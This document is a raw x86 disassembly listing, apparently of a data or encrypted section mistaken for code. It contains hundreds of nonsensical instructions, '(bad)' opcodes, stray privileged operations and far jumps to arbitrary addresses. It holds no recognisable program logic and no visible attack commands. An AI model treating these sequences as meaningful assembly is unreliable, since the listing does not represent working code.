  40dd91:	add    BYTE PTR [eax+0x25],ah
  40dd94:	dec    edi
  40dd95:	and    edi,DWORD PTR [ebx]
  40dd97:	add    DWORD PTR [edi-0x2e04166c],eax
  40dd9d:	fbstp  TBYTE PTR [esi+0x45d03f3d]
  40dda3:	sbb    BYTE PTR [esi+edx*4+0x733e3588],0x58
  40ddab:	fild   DWORD PTR [ebp+eax*8-0x27]
  40ddaf:	imul   esp,DWORD PTR [eax-0x69],0x5a718fcc
  40ddb6:	or     eax,0x910bbdba
  40ddbb:	pop    edi
  40ddbc:	xchg   BYTE PTR [ecx],bh
  40ddbe:	push   ebx
  40ddbf:	imul   ebx,DWORD PTR [edi+edx*2],0x8
  40ddc3:	fucomi st,st(7)
  40ddc5:	leave  
  40ddc6:	gs xchg ecx,eax
  40ddc8:	ss loop 0x40de4a
  40ddcb:	sbb    al,0xa
  40ddcd:	test   al,0x7f
  40ddcf:	mov    bl,0x50
  40ddd1:	pushf  
  40ddd2:	fild   WORD PTR [esi+0x3a9b0928]
  40ddd8:	xchg   esp,eax
  40ddd9:	nop
  40ddda:	push   esp
  40dddc:	adc    bl,al
  40ddde:	in     eax,0x7b
  40dde0:	pop    edx
  40dde1:	mov    edi,0x3c856b78
  40dde6:	pushf  
  40dde7:	adc    al,0xdd
  40dde9:	ja     0x40ddd8
  40ddeb:	dec    eax
  40ddec:	mov    bl,dl
  40ddee:	cmp    bh,al
  40ddf0:	fldenv [edx-0x36cdcb23]
  40ddf6:	mov    edx,0xec2465f5
  40ddfb:	sbb    al,0x18
  40ddfd:	jmp    0xe97a:0x945db65a
  40de04:	icebp  
  40de05:	push   esp
  40de06:	push   esi
  40de07:	addr16 dec esp
  40de09:	xchg   edi,eax
  40de0a:	stos   BYTE PTR es:[edi],al
  40de0b:	cs fdiv st,st(1)
  40de0e:	mov    ah,0xb0
  40de10:	into   
  40de11:	call   0xb76c43d2
  40de16:	lock in eax,0xb1
  40de19:	test   BYTE PTR ds:0x61491978,bl
  40de1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de20:	ins    DWORD PTR es:[edi],dx
  40de21:	cmp    DWORD PTR [edx-0x1dec7939],edi
  40de27:	or     cl,BYTE PTR [ecx]
  40de29:	scas   eax,DWORD PTR es:[edi]
  40de2a:	jae    0x40dea6
  40de2c:	lock mov ch,0x8b
  40de2f:	mov    esp,0x222e1ee3
  40de34:	(bad)  
  40de35:	inc    ebx
  40de36:	sub    DWORD PTR [edi-0x60],eax
  40de39:	and    al,bl
  40de3b:	inc    edx
  40de3c:	popa   
  40de3d:	dec    edi
  40de3e:	mov    DWORD PTR [ebp-0x487e7f5c],edi
  40de44:	add    al,0x7
  40de46:	or     al,0x61
  40de48:	inc    eax
  40de49:	popf   
  40de4a:	xchg   esi,eax
  40de4b:	inc    ebp
  40de4c:	icebp  
  40de4d:	std    
  40de4e:	out    0xc0,eax
  40de50:	mov    esp,0xfc004d39
  40de55:	xchg   edx,edi
  40de57:	cwde   
  40de58:	mov    BYTE PTR [edx+0x524d119b],dh
  40de5e:	ret    0x527f
  40de61:	ins    BYTE PTR es:[edi],dx
  40de62:	jno    0x40de9c
  40de64:	dec    ecx
  40de65:	test   al,0xee
  40de67:	or     al,0xc0
  40de69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de6a:	sahf   
  40de6b:	ror    DWORD PTR [esi-0x274eb3a1],1
  40de71:	mov    ebp,edx
  40de73:	inc    ebx
  40de74:	mov    cl,0x29
  40de76:	repnz mov al,0x17
  40de79:	mov    ecx,0xa7f2e972
  40de7e:	test   eax,0x5c4b3703
  40de83:	inc    ebp
  40de84:	scas   eax,DWORD PTR es:[di]
  40de86:	outs   dx,BYTE PTR ds:[esi]
  40de87:	mov    ds:0x86dae1d9,eax
  40de8c:	xchg   DWORD PTR [ebx],edi
  40de8e:	dec    ebx
  40de8f:	mov    ah,BYTE PTR fs:[eax]
  40de92:	dec    eax
  40de93:	icebp  
  40de94:	and    ch,BYTE PTR [ebx-0x40]
  40de97:	adc    edx,DWORD PTR [edx+0x4de7531b]
  40de9d:	jns    0x40df10
  40de9f:	mov    ss,edx
  40dea1:	fisttp DWORD PTR [edx]
  40dea3:	(bad)  
  40dea4:	adc    eax,0xdbfe358
  40dea9:	fs xchg edx,eax
  40deab:	jb     0x40de45
  40dead:	je     0x40dece
  40deaf:	sbb    ecx,DWORD PTR [edi+0x3d]
  40deb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40deb3:	push   es
  40deb4:	mov    ah,0xde
  40deb6:	xchg   edi,eax
  40deb7:	mov    WORD PTR [ecx+0x2965259b],gs
  40debd:	call   0x39af:0xf77a9041
  40dec4:	cs pop ebx
  40dec6:	sbb    al,0x69
  40dec8:	jae    0x40de69
  40deca:	and    edx,ecx
  40decc:	les    ecx,FWORD PTR [ebx+0x3f]
  40decf:	or     edx,ebp
  40ded1:	jmp    0xda63:0xcd388d10
  40ded8:	jge    0x40df28
  40deda:	pop    ss
  40dedb:	ins    DWORD PTR es:[edi],dx
  40dedc:	lea    esi,[edi]
  40dede:	cwde   
  40dedf:	adc    dl,BYTE PTR [ebx-0x608184ae]
  40dee5:	out    0x2d,al
  40dee7:	repnz sbb eax,0x2b2f05df
  40deed:	jb     0x40de76
  40deef:	mov    ds:0x85228578,eax
  40def4:	pusha  
  40def5:	hlt    
  40def6:	cs inc ecx
  40def8:	loope  0x40de7a
  40defa:	retf   
  40defb:	mov    al,al
  40defd:	mov    dl,0x13
  40deff:	pop    esi
  40df00:	popf   
  40df01:	lock inc esi
  40df03:	out    0x78,eax
  40df05:	mov    WORD PTR [ecx],ds
  40df07:	stos   BYTE PTR es:[edi],al
  40df08:	mov    BYTE PTR [esi+ebp*2],cl
  40df0b:	scas   eax,DWORD PTR es:[edi]
  40df0c:	repz dec eax
  40df0e:	fistp  QWORD PTR [esi]
  40df10:	mov    cl,0xce
  40df12:	jp     0x40dec3
  40df14:	call   0xea27c96
  40df19:	pushf  
  40df1a:	jmp    DWORD PTR [ecx]
  40df1c:	je     0x40df7c
  40df1e:	add    eax,0xedd56c23
  40df23:	add    BYTE PTR [eax+0x68],0x70
  40df27:	outs   dx,BYTE PTR gs:[esi]
  40df29:	dec    esi
  40df2a:	dec    esp
  40df2b:	adc    al,0x13
  40df2d:	mov    edx,0xdc8e8bb4
  40df32:	mov    dh,0xf5
  40df34:	mov    edi,0xa7fb5d9c
  40df39:	mov    cl,0xda
  40df3b:	mov    ah,0x23
  40df3d:	js     0x40df13
  40df3f:	jmp    0x501b561c
  40df44:	sub    al,0x74
  40df46:	jge    0x40dfbd
  40df48:	mov    esi,0xc4992df5
  40df4d:	cmp    eax,0x6867cabc
  40df52:	aas    
  40df53:	es cmp bh,bl
  40df56:	enter  0x8806,0xbf
  40df5a:	sub    BYTE PTR [esi-0x6343841d],ah
  40df60:	add    ecx,ebp
  40df62:	mov    cl,0x7e
  40df64:	xor    bh,bh
  40df66:	mov    dl,0x3f
  40df68:	fnstenv [eax+0x7408bc79]
  40df6e:	retf   
  40df6f:	fs mov ebp,0x70d30599
  40df75:	pushf  
  40df76:	(bad)  
  40df77:	retf   0xbd75
  40df7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df7b:	ret    0x4927
  40df7e:	sub    al,0x12
  40df80:	jmp    0xd25b0dc9
  40df85:	ret    0x990a
  40df88:	mov    bh,0xc0
  40df8a:	nop
  40df8b:	cmp    ah,ah
  40df8d:	out    0x21,al
  40df8f:	mov    esp,0x34424ebb
  40df94:	and    cl,0x43
  40df97:	adc    al,0xeb
  40df99:	mov    ?,WORD PTR [esi]
  40df9b:	cmp    DWORD PTR ds:0xa32c0940,ebx
  40dfa1:	mov    al,0x32
  40dfa3:	mov    bl,0x41
  40dfa5:	xchg   BYTE PTR [esi],ah
  40dfa7:	or     DWORD PTR [ebp+0x3a],ecx
  40dfaa:	mul    BYTE PTR [edi+ebx*8]
  40dfad:	imul   edi,DWORD PTR [esi],0xffffffc3
  40dfb0:	cwde   
  40dfb1:	jnp    0x40dff0
  40dfb3:	cmp    BYTE PTR [eax+0x38],dh
  40dfb6:	ins    DWORD PTR es:[edi],dx
  40dfb7:	or     BYTE PTR ds:0xa3ebd119,bh
  40dfbd:	push   edi
  40dfbe:	xlat   BYTE PTR ds:[ebx]
  40dfbf:	push   esp
  40dfc0:	cli    
  40dfc1:	pop    esi
  40dfc2:	sbb    dl,BYTE PTR [ebp+0x76]
  40dfc5:	pop    ecx
  40dfc6:	call   0x57dd8a19
  40dfcb:	push   esp
  40dfcc:	stc    
  40dfcd:	hlt    
  40dfce:	xchg   ebx,eax
  40dfcf:	call   0x7c3f:0x52c0b478
  40dfd6:	fcom   st(1)
  40dfd8:	push   0xffffffe2
  40dfda:	pop    ecx
  40dfdb:	mov    dh,0x6e
  40dfdd:	adc    al,0x5
  40dfdf:	mov    esi,0xa624d88
  40dfe4:	rol    al,0xc6
  40dfe7:	(bad)  
  40dfe8:	mov    esp,0xff4dfa32
  40dfed:	jg     0x40dfa6
  40dfef:	sbb    BYTE PTR [edi],0x1d
  40dff2:	xlat   BYTE PTR ds:[ebx]
  40dff3:	xor    al,0xd8
  40dff5:	mov    ah,0x76
  40dff7:	inc    DWORD PTR [esp+ecx*4-0x54c874e1]
  40dffe:	repz lahf 
  40e000:	call   0xce20dccb
  40e005:	lods   al,BYTE PTR ds:[esi]
  40e006:	push   ecx
  40e007:	sub    al,0xb
  40e009:	xchg   ebp,eax
  40e00a:	and    WORD PTR [esi+0x46],si
  40e00e:	push   edx
  40e00f:	pop    esi
  40e010:	mov    eax,ds:0x1c536c24
  40e015:	mul    dl
  40e017:	push   cs
  40e018:	xor    bh,BYTE PTR [edx-0x6d]
  40e01b:	mov    BYTE PTR [edi+0x74],dh
  40e01e:	test   eax,0x6ac75df4
  40e023:	cli    
  40e024:	or     BYTE PTR [ecx+0x12a01868],0x29
  40e02b:	mov    ch,0xfc
  40e02d:	sub    DWORD PTR [edx-0x76],edi
  40e030:	mov    dl,0xaf
  40e032:	adc    BYTE PTR [ecx],cl
  40e034:	mov    bh,0xc5
  40e036:	fisttp QWORD PTR [ebx]
  40e038:	sub    al,0x5
  40e03a:	jns    0x40dfdd
  40e03c:	es cld 
  40e03e:	or     ah,BYTE PTR [ebp+0x6c]
  40e041:	dec    esp
  40e042:	ror    BYTE PTR [edx-0x5424a66e],cl
  40e048:	cmp    BYTE PTR [ecx],ah
  40e04a:	inc    ebp
  40e04b:	pop    esi
  40e04c:	lds    eax,FWORD PTR [edi+0x2258ba7e]
  40e052:	lds    ebp,FWORD PTR [edi+eiz*1]
  40e055:	cmp    ch,BYTE PTR [edx-0x1]
  40e058:	leave  
  40e059:	in     al,dx
  40e05a:	adc    BYTE PTR [ecx+0x1b],bl
  40e05d:	retf   0xe319
  40e060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e061:	cmp    eax,0xd49a2a4c
  40e066:	stos   DWORD PTR es:[edi],eax
  40e067:	adc    BYTE PTR [esi-0x484ad686],bh
  40e06d:	pop    ds
  40e06e:	jne    0x40e014
  40e070:	inc    esp
  40e071:	add    ecx,esi
  40e073:	sub    bh,dh
  40e075:	mov    bh,0xfd
  40e077:	cmp    al,0x2
  40e079:	inc    ebp
  40e07a:	mov    al,ds:0x71861ef5
  40e07f:	popa   
  40e080:	push   eax
  40e081:	sbb    BYTE PTR [esp+eax*8],bh
  40e084:	loop   0x40e0a0
  40e086:	dec    ecx
  40e087:	call   0x7da3:0x5e263dd
  40e08e:	ffreep st(1)
  40e090:	push   ds
  40e091:	dec    ebp
  40e092:	mov    dl,0x1c
  40e094:	jecxz  0x40e0eb
  40e096:	test   DWORD PTR [eax+0x78],ebx
  40e099:	aas    
  40e09a:	loopne 0x40e0c7
  40e09c:	fs sub dh,dl
  40e09f:	xchg   ebp,eax
  40e0a0:	mov    edx,0xd2b732d2
  40e0a5:	push   0x58ae2f4b
  40e0aa:	push   esi
  40e0ab:	xor    eax,0x46e380f5
  40e0b0:	(bad)  
  40e0b1:	fld    DWORD PTR [esp+edx*8+0x6beb658d]
  40e0b8:	adc    al,0x9c
  40e0ba:	pop    ss
  40e0bb:	push   ds
  40e0bc:	adc    BYTE PTR [edi-0x29],ch
  40e0bf:	outs   dx,BYTE PTR ds:[esi]
  40e0c0:	fs dec ecx
  40e0c2:	test   al,0x45
  40e0c4:	xadd   DWORD PTR ds:0xc68ba7a3,eax
  40e0cb:	inc    esi
  40e0cc:	mov    ebx,0x52522997
  40e0d1:	push   ebx
  40e0d2:	sbb    DWORD PTR [edi-0x33],edi
  40e0d5:	int3   
  40e0d6:	dec    esp
  40e0d7:	and    BYTE PTR ds:0x10a7d946,bh
  40e0dd:	jle    0x40e0f0
  40e0df:	fmul   DWORD PTR [ecx+edi*4+0x4dcb7fff]
  40e0e6:	leave  
  40e0e7:	jmp    0x40e0d0
  40e0e9:	sahf   
  40e0ea:	cmp    eax,0x9aaec7a4
  40e0ef:	aaa    
  40e0f0:	dec    esp
  40e0f1:	aad    0xa3
  40e0f3:	adc    eax,0xb10021ec
  40e0f8:	pop    ebp
  40e0f9:	(bad)  
  40e0fa:	cmp    DWORD PTR [edx-0xb],edi
  40e0fd:	repz push edi
  40e0ff:	stos   DWORD PTR es:[edi],eax
  40e100:	les    edi,FWORD PTR [edx-0x32]
  40e103:	(bad)  
  40e104:	push   ecx
  40e105:	ins    DWORD PTR es:[edi],dx
  40e106:	xor    DWORD PTR [edx-0x2e],0x6e37a49
  40e10d:	aaa    
  40e10e:	and    ebx,ecx
  40e110:	push   ebp
  40e111:	dec    esp
  40e112:	adc    eax,0x1430db4c
  40e117:	imul   eax,DWORD PTR [eax],0x8a95cefa
  40e11d:	dec    edi
  40e11e:	es cmp ebx,esp
  40e121:	mov    ecx,0xd225ba0d
  40e126:	and    DWORD PTR [edi-0x43],ebp
  40e129:	outs   dx,BYTE PTR ds:[esi]
  40e12a:	mov    ds:0x5e82dafb,al
  40e12f:	push   ebx
  40e130:	inc    ebp
  40e131:	fst    DWORD PTR ds:0x8c9ef0aa
  40e137:	call   0x2a39536a
  40e13c:	or     ah,ah
  40e13e:	and    al,BYTE PTR [edx]
  40e140:	test   al,0xf6
  40e142:	mov    edx,0xf22ccc0a
  40e147:	sub    al,0xcd
  40e149:	sbb    DWORD PTR [ecx+0xa05a2b4],ebp
  40e14f:	ret    
  40e150:	sar    DWORD PTR [eax+eiz*2-0x67],1
  40e154:	daa    
  40e155:	mov    ebp,0x8fcf0370
  40e15a:	mov    ds:0x6d96e7c4,eax
  40e15f:	pop    es
  40e160:	mov    al,ds:0x853898fd
  40e165:	mov    dh,0xc8
  40e167:	leave  
  40e168:	hlt    
  40e169:	mov    dl,0xcf
  40e16b:	retf   
  40e16c:	stc    
  40e16d:	and    bl,ah
  40e16f:	mov    bl,0x33
  40e171:	push   es
  40e172:	jl     0x40e183
  40e174:	js     0x40e1a0
  40e176:	shl    BYTE PTR [edi],1
  40e178:	lods   eax,DWORD PTR ds:[esi]
  40e179:	adc    BYTE PTR [esi+0x4e1aa733],bh
  40e17f:	mov    ds:0xb9c8fa1,eax
  40e184:	mov    esp,0x5a7dcdf9
  40e189:	int    0x63
  40e18b:	and    BYTE PTR [edx+0x7231ff54],dh
  40e191:	add    al,0x53
  40e193:	dec    esi
  40e194:	dec    esi
  40e195:	outs   dx,BYTE PTR ds:[esi]
  40e196:	repnz inc esp
  40e198:	gs push esp
  40e19a:	lds    ebp,FWORD PTR [esi]
  40e19c:	ret    
  40e19d:	in     eax,dx
  40e19e:	cmp    DWORD PTR [ecx],esi
  40e1a0:	push   ss
  40e1a1:	pop    ecx
  40e1a2:	daa    
  40e1a3:	mov    ch,0xfc
  40e1a5:	(bad)  
  40e1a6:	fsub   QWORD PTR [edi]
  40e1a8:	xchg   ebp,eax
  40e1a9:	and    ebp,DWORD PTR [ebp-0x80]
  40e1ac:	xchg   edi,eax
  40e1ad:	cmp    DWORD PTR ds:0x1173edd7,esp
  40e1b3:	inc    eax
  40e1b4:	add    ah,BYTE PTR [ecx-0x3d8bbdf1]
  40e1ba:	lock add ecx,DWORD PTR gs:[ebp+0x35]
  40e1bf:	mov    ah,0x4c
  40e1c1:	push   0xffffffec
  40e1c3:	and    ebp,ebp
  40e1c5:	loope  0x40e22d
  40e1c7:	mov    BYTE PTR [ecx+0x6de5dede],dh
  40e1cd:	jle    0x40e245
  40e1cf:	pop    ecx
  40e1d0:	or     eax,0x57cd6dec
  40e1d5:	jo     0x40e1c6
  40e1d7:	jae    0x40e24a
  40e1d9:	xor    eax,0x33b3092d
  40e1de:	fmul   QWORD PTR [ecx-0x282b2363]
  40e1e4:	mov    esp,0xb4703293
  40e1e9:	sub    DWORD PTR [eax+edx*1],esp
  40e1ec:	mov    WORD PTR [ebp-0x55],ss
  40e1ef:	add    al,0xf7
  40e1f1:	pusha  
  40e1f2:	jb     0x40e197
  40e1f4:	and    DWORD PTR [ebp-0x51d9b316],ecx
  40e1fa:	pushf  
  40e1fb:	sbb    BYTE PTR [edi],ch
  40e1fd:	pop    ss
  40e1fe:	push   0x7b962d29
  40e203:	pop    es
  40e204:	add    BYTE PTR cs:[edi+eiz*8+0x16],al
  40e209:	mov    eax,ds:0x278ef04b
  40e20e:	xor    ecx,edi
  40e210:	out    dx,eax
  40e211:	pop    esp
  40e212:	add    ebp,DWORD PTR [edx+0x42]
  40e215:	(bad)  
  40e216:	mov    ch,0xae
  40e218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e219:	sbb    BYTE PTR [ecx],bh
  40e21b:	jb     0x40e1d8
  40e21d:	and    DWORD PTR [ecx],eax
  40e21f:	sbb    eax,eax
  40e221:	sub    edi,DWORD PTR [edi+0x66185b69]
  40e227:	ror    BYTE PTR [eax],cl
  40e229:	iret   
  40e22a:	mov    ?,WORD PTR [eax-0x546fd4f8]
  40e230:	fwait
  40e231:	jne    0x40e2a4
  40e233:	pop    ss
  40e234:	mov    BYTE PTR ds:0xff290f24,bl
  40e23a:	call   0x7f9c26c7
  40e23f:	sub    esp,DWORD PTR [ebx+0x173a6d81]
  40e245:	cwde   
  40e246:	hlt    
  40e247:	lods   eax,DWORD PTR ds:[esi]
  40e248:	mov    bl,0x4b
  40e24a:	or     dh,BYTE PTR [eax-0x75238b8c]
  40e250:	out    0x89,al
  40e252:	sbb    ch,BYTE PTR [edx+ebx*8+0x4a]
  40e256:	enter  0x718,0x18
  40e25a:	test   BYTE PTR [edx+esi*1+0x7c25fdfd],ch
  40e261:	sar    ecx,1
  40e263:	pop    ss
  40e264:	xor    esp,ecx
  40e266:	shr    DWORD PTR [esi-0x1ed43bc6],1
  40e26c:	loope  0x40e278
  40e26e:	mov    fs,WORD PTR [edx+0x5]
  40e271:	int3   
  40e272:	hlt    
  40e273:	pop    ds
  40e274:	push   esi
  40e275:	sahf   
  40e276:	stos   DWORD PTR es:[edi],eax
  40e277:	ret    
  40e278:	push   eax
  40e279:	loopne 0x40e2d8
  40e27b:	inc    edi
  40e27c:	xor    ch,BYTE PTR [ebx+esi*2+0x27]
  40e280:	sbb    al,0x89
  40e282:	mov    ecx,0x248052f4
  40e287:	mov    dh,0xd0
  40e289:	sbb    eax,0x97623282
  40e28e:	dec    ebx
  40e28f:	dec    edi
  40e290:	xor    al,0xb9
  40e292:	and    ah,BYTE PTR [esi]
  40e294:	leave  
  40e295:	or     ecx,DWORD PTR [ebp+0x7879f07]
  40e29b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e29c:	test   DWORD PTR [esp+ebp*4-0x5b6a046e],edi
  40e2a3:	mov    ebx,0x8a400194
  40e2a8:	mov    edx,0x8f34356c
  40e2ad:	in     al,dx
  40e2ae:	cli    
  40e2af:	pop    ebx
  40e2b0:	push   ebx
  40e2b1:	ins    BYTE PTR es:[edi],dx
  40e2b2:	icebp  
  40e2b3:	cmp    BYTE PTR [edx],dl
  40e2b5:	pop    ebx
  40e2b6:	(bad)
  40e2b9:	push   cs
  40e2ba:	fs push 0x1b7d7fd3
  40e2c0:	push   esp
  40e2c1:	arpl   WORD PTR [esi-0x2c],sp
  40e2c4:	rcr    BYTE PTR [edi+0x54529a1e],0xfd
  40e2cb:	xor    al,0x23
  40e2cd:	mul    BYTE PTR [edx]
  40e2cf:	fist   DWORD PTR [eax+0x6b0b2924]
  40e2d5:	rcl    BYTE PTR [esi+0x6],cl
  40e2d8:	outs   dx,BYTE PTR ds:[esi]
  40e2d9:	nop
  40e2da:	inc    esi
  40e2db:	test   eax,0xbd3fb4ea
  40e2e0:	mov    bl,0xab
  40e2e2:	(bad)  
  40e2e3:	loope  0x40e2af
  40e2e5:	pop    esp
  40e2e6:	repnz cmp BYTE PTR [ecx+0x16],dl
  40e2ea:	fwait
  40e2eb:	pop    eax
  40e2ec:	js     0x40e2e7
  40e2ee:	xor    ecx,ebx
  40e2f0:	stos   BYTE PTR es:[edi],al
  40e2f1:	jno    0x40e35d
  40e2f3:	inc    edi
  40e2f4:	jae    0x40e298
  40e2f6:	add    al,0xf2
  40e2f8:	add    cl,bh
  40e2fa:	pop    edx
  40e2fb:	xchg   esp,eax
  40e2fc:	fwait
  40e2fd:	ja     0x40e37a
  40e2ff:	adc    dh,BYTE PTR [ecx+eax*2-0x52ea4eb0]
  40e306:	test   BYTE PTR [esi-0x1de79744],ah
  40e30c:	pop    ebp
  40e30d:	add    esi,DWORD PTR [ebx]
  40e30f:	inc    ecx
  40e310:	xor    esi,ebx
  40e312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e313:	and    eax,0x1927e806
  40e318:	out    dx,al
  40e319:	out    dx,al
  40e31a:	imul   edi,DWORD PTR [esi-0x639b20b6],0x45
  40e321:	jbe    0x40e2e9
  40e323:	cmp    bh,BYTE PTR [esi]
  40e325:	push   0x2fb89fd
  40e32a:	mov    edx,0x584e5902
  40e32f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e330:	sub    al,0xe2
  40e332:	test   BYTE PTR [ecx-0x51],ah
  40e335:	out    dx,al
  40e336:	add    BYTE PTR [ecx],bh
  40e338:	sub    ebp,DWORD PTR [edi+ecx*4-0x2334a44c]
  40e33f:	push   es
  40e340:	and    edx,ebp
  40e342:	repnz (bad) 
  40e345:	ret    0x1f3f
  40e348:	mov    ecx,0x2d4147ba
  40e34d:	ret    0xb9ca
  40e350:	or     eax,0x2f1fd64a
  40e355:	mul    BYTE PTR [ebx-0x15750d46]
  40e35b:	jo     0x40e3a8
  40e35d:	jno    0x40e3be
  40e35f:	mov    al,0xdc
  40e361:	popa   
  40e362:	xchg   ecx,eax
  40e363:	xchg   esp,eax
  40e364:	pusha  
  40e365:	adc    ecx,DWORD PTR ds:0x97d0ce5b
  40e36b:	mov    dl,0x3d
  40e36d:	es into 
  40e36f:	bound  esi,QWORD PTR [eax-0x3]
  40e372:	fxam   
  40e374:	das    
  40e375:	adc    al,BYTE PTR [edi+0x6f791bdb]
  40e37b:	push   esi
  40e37c:	outs   dx,BYTE PTR ds:[esi]
  40e37d:	and    BYTE PTR [edx-0x77f379a8],cl
  40e383:	nop
  40e384:	dec    ebp
  40e385:	mov    edi,DWORD PTR [ecx]
  40e387:	leave  
  40e388:	(bad)  
  40e389:	mov    WORD PTR [edx],gs
  40e38b:	add    eax,0x281d736b
  40e390:	jg     0x40e345
  40e392:	xchg   ecx,eax
  40e393:	jl     0x40e3fa
  40e395:	dec    edx
  40e396:	gs dec ah
  40e399:	loopne 0x40e38c
  40e39b:	sub    DWORD PTR [edi],esp
  40e39d:	xor    esp,DWORD PTR [esi]
  40e39f:	std    
  40e3a0:	xchg   esi,eax
  40e3a1:	mov    eax,ds:0x28e2c70e
  40e3a6:	std    
  40e3a7:	jo     0x40e3be
  40e3a9:	jmp    FWORD PTR [eax+0x6a]
  40e3ac:	lock inc esi
  40e3ae:	les    edx,FWORD PTR [ecx+0x59]
  40e3b1:	call   0x2198:0x4c943442
  40e3b8:	icebp  
  40e3b9:	(bad)
  40e3bc:	mov    ds:0x6054fdc2,al
  40e3c1:	sti    
  40e3c2:	iret   
  40e3c3:	cli    
  40e3c4:	imul   edi,DWORD PTR [ecx-0x2e0248c2],0xbd62f87
  40e3ce:	push   ebp
  40e3cf:	jmp    0x40e362
  40e3d1:	push   0x6b568cb9
  40e3d6:	sub    esi,DWORD PTR [edi-0x1987eb8b]
  40e3dc:	fsubp  st(2),st
  40e3de:	jecxz  0x40e369
  40e3e0:	ins    DWORD PTR es:[edi],dx
  40e3e1:	je     0x40e3ba
  40e3e3:	in     al,0xcf
  40e3e5:	shl    dh,cl
  40e3e7:	outs   dx,BYTE PTR ds:[esi]
  40e3e8:	test   eax,0xa59158a6
  40e3ed:	mov    al,0x49
  40e3ef:	cli    
  40e3f0:	cmp    al,0xa9
  40e3f2:	ret    
  40e3f3:	dec    edx
  40e3f4:	je     0x40e43a
  40e3f6:	xor    DWORD PTR [ebx-0x7c],ebp
  40e3f9:	jbe    0x40e3c1
  40e3fb:	out    0xa2,ax
  40e3fe:	sbb    DWORD PTR [ebx+0x55],ecx
  40e401:	dec    ebx
  40e402:	adc    eax,0x130b6f51
  40e407:	inc    eax
  40e408:	jno    0x40e41d
  40e40a:	pop    ebx
  40e40b:	cmp    ch,bh
  40e40d:	ins    BYTE PTR es:[edi],dx
  40e40e:	push   ecx
  40e40f:	inc    edi
  40e410:	xor    bh,bh
  40e412:	lds    edx,FWORD PTR [eax+edi*8-0x18bf1b6]
  40e419:	fimul  WORD PTR [ecx-0x5e]
  40e41c:	stc    
  40e41d:	in     eax,0x41
  40e41f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e420:	mov    ds,edx
  40e422:	test   bh,cl
  40e424:	xchg   esi,eax
  40e425:	cdq    
  40e426:	imul   ebx,DWORD PTR ds:0xbdde4d55,0xd04c7eb1
  40e430:	jge    0x40e3fc
  40e432:	sub    eax,0x64eaa338
  40e437:	mov    BYTE PTR [ecx],bl
  40e439:	bound  esp,QWORD PTR [ebp+0x3eb9cc16]
  40e43f:	test   eax,0x2ce71342
  40e444:	gs and eax,0x86ab810e
  40e44a:	push   esi
  40e44b:	push   edx
  40e44c:	xchg   esi,eax
  40e44d:	nop
  40e44e:	inc    ecx
  40e44f:	adc    DWORD PTR [esi-0x34],ecx
  40e452:	jo     0x40e436
  40e454:	sar    DWORD PTR [ecx+0xdeabffb],cl
  40e45a:	loop   0x40e4b3
  40e45c:	mov    eax,DWORD PTR [edx+0x20bb07a3]
  40e462:	(bad)  
  40e463:	fadd   st(7),st
  40e465:	clc    
  40e466:	jns    0x40e3f0
  40e468:	pop    ebx
  40e469:	mov    ds:0x8b1f60f9,al
  40e46e:	cdq    
  40e46f:	adc    dl,BYTE PTR [edx+0x51f4cf51]
  40e475:	mov    eax,ds:0x14477b48
  40e47a:	pop    ebx
  40e47b:	mov    eax,0xefd061d9
  40e480:	cmp    BYTE PTR [eax],al
  40e482:	and    eax,0x7caf474c
  40e487:	xchg   ebx,eax
  40e488:	ss add eax,0xe26e38a0
  40e48e:	out    dx,eax
  40e48f:	and    DWORD PTR [edx],edx
  40e491:	mov    edx,0x52d1fcd6
  40e496:	out    dx,al
  40e497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e498:	fild   DWORD PTR [esp+esi*2+0x47]
  40e49c:	fdiv   st,st(1)
  40e49e:	aaa    
  40e49f:	push   edi
  40e4a0:	mov    edx,0x17c4cefa
  40e4a5:	rol    BYTE PTR [eax-0x3cf15679],cl
  40e4ab:	xor    DWORD PTR [ebx-0x60],ebx
  40e4ae:	pusha  
  40e4af:	ins    BYTE PTR es:[edi],dx
  40e4b0:	stc    
  40e4b1:	jbe    0x40e4b6
  40e4b3:	mov    DWORD PTR [edi],eax
  40e4b5:	rol    BYTE PTR ds:0xb820464c,1
  40e4bb:	jno    0x40e486
  40e4bd:	in     al,0xfd
  40e4bf:	pop    ds
  40e4c0:	test   eax,0xe1e4f658
  40e4c5:	xor    al,0xd8
  40e4c7:	mov    edi,0x529ef9fb
  40e4cc:	popf   
  40e4cd:	mov    WORD PTR [ebp+0x60],?
  40e4d0:	shl    DWORD PTR [edx+ebp*1],0x8f
  40e4d4:	mov    al,BYTE PTR [ecx]
  40e4d6:	pop    ds
  40e4d7:	mov    ss,WORD PTR [ecx]
  40e4d9:	test   al,0x3
  40e4db:	ds in  eax,dx
  40e4dd:	das    
  40e4de:	lock lods eax,DWORD PTR ds:[esi]
  40e4e0:	hlt    
  40e4e1:	clc    
  40e4e2:	pop    ss
  40e4e3:	adc    DWORD PTR [ecx+0x7],esp
  40e4e6:	pcmpgtd mm4,QWORD PTR [edi-0x32]
  40e4ea:	jp     0x40e56b
  40e4ec:	ds mov ecx,0x66ca2346
  40e4f2:	mov    dl,dl
  40e4f4:	push   ds
  40e4f5:	pop    es
  40e4f6:	loope  0x40e501
  40e4f8:	ja     0x40e549
  40e4fa:	shl    DWORD PTR [ebx-0x5deadc4f],0x25
  40e501:	(bad)  
  40e502:	pop    edx
  40e503:	dec    ebx
  40e504:	xchg   ebx,eax
  40e505:	jge    0x40e54c
  40e507:	dec    edx
  40e508:	out    0x1d,al
  40e50a:	or     BYTE PTR ds:0x618abd68,ah
  40e510:	add    dh,BYTE PTR [ebp+eax*8-0x38]
  40e514:	or     BYTE PTR [ebp-0xc],cl
  40e517:	jp     0x40e57a
  40e519:	mov    WORD PTR [ebp+0x450bce5e],ds
  40e51f:	pop    eax
  40e520:	sti    
  40e521:	mov    edi,0x88ee2a85
  40e526:	scas   eax,DWORD PTR es:[edi]
  40e527:	xlat   BYTE PTR ds:[ebx]
